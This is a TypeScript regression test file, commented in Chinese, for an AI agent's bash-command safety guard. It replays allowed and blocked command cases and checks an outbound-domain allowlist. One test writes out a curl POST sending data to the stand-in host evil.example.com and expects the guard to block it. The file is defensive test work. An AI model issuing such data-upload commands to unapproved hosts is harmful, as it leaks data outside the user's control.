/**
 * guard 回放回归测试（F20261029gblkv）——守卫行为以真实使用为准。
 *
 * 三组用例：误拦实录（必须放行）/ 事故锚定+黑名单（必须拦）/ 日常抽样（必须放行）。
 * 守卫任何改动必须全量回放全绿。
 *
 * 测试基建（受控环境，全平台确定性）：
 * - projectRoot 用临时目录（内含受控 .otter-buddy.pid）——不读主仓真实 PID 文件与
 *   allowed-service-ports.json，防开发机配置漂移污染判定（如真实白名单含用例端口）；
 * - processProbe 注入桩：identity() 恒 null（「查无此进程」=非主进程）——三查在 CI
 *   与开发机上行为一致，不真跑 ps（真查询链路由 CI macos job 覆盖守卫单测同源逻辑）。
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";
import { checkBashCommandSafety } from "../../../src/frameworks/agent/bash-safety-guard";
import { falsePositiveCases, mustBlockCases, dailyTrafficCases } from "./cases-2026-10-29";

/** 模拟主进程上下文：测试注入的 PID（与真实系统解耦——判定逻辑同源） */
const FAKE_MAIN_PID = 29000;

let projectRoot: string;

beforeAll(() => {
  projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), "guard-replay-"));
  fs.writeFileSync(path.join(projectRoot, ".otter-buddy.pid"), `${FAKE_MAIN_PID}\n`, "utf-8");
});

afterAll(() => {
  fs.rmSync(projectRoot, { recursive: true, force: true });
});

/** 判定（受控 probe：查无此进程 → 非主进程；与 CI 环境无关的确定性） */
function judge(command: string): "allow" | "block" {
  const block = checkBashCommandSafety(command, FAKE_MAIN_PID, undefined, {
    projectRoot,
    processProbe: { whoListens: () => null, identity: () => null },
  });
  return block ? "block" : "allow";
}

describe("guard 回放·误拦实录（2026-10-29 healing 台账 + #1710 信封面）——终态必须全部放行", () => {
  for (const c of falsePositiveCases) {
    it(`[allow] ${c.source}: ${c.command.slice(0, 60)}…`, () => {
      expect(judge(c.command)).toBe("allow");
    });
  }
});

describe("guard 回放·事故锚定+黑名单负门——必须拦截", () => {
  for (const c of mustBlockCases) {
    it(`[block] ${c.source}: ${c.command.slice(0, 60)}…`, () => {
      expect(judge(c.command)).toBe("block");
    });
  }
});

describe("guard 回放·日常抽样——守卫零感知", () => {
  for (const c of dailyTrafficCases) {
    it(`[allow] ${c.source}: ${c.command.slice(0, 60)}…`, () => {
      expect(judge(c.command)).toBe("allow");
    });
  }
});

describe("guard 回放·B 类域名表语义（config.yaml bashGuard.allowedEgressDomains）", () => {
  it("配置表内域名 POST 放行（后缀匹配含子域）", () => {
    const block = checkBashCommandSafety(
      "curl -X POST https://api.github.com/repos/x/y/issues -d '{\"title\":\"t\"}'",
      FAKE_MAIN_PID, undefined,
      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: ["github.com"] },
    );
    expect(block).toBeNull();
  });
  it("配置表外域名 POST 拦（非协作域名 fail-closed）", () => {
    const block = checkBashCommandSafety(
      "curl -X POST https://evil.example.com -d '{\"x\":1}'",
      FAKE_MAIN_PID, undefined,
      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: ["github.com"] },
    );
    expect(block).toContain("上传");
  });
  it("显式空数组 = fail-closed（内置缺省表不回退）", () => {
    const block = checkBashCommandSafety(
      "curl -X POST https://api.github.com/repos/x/y/issues -d '{\"title\":\"t\"}'",
      FAKE_MAIN_PID, undefined,
      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: [] },
    );
    expect(block).toContain("上传");
  });
});
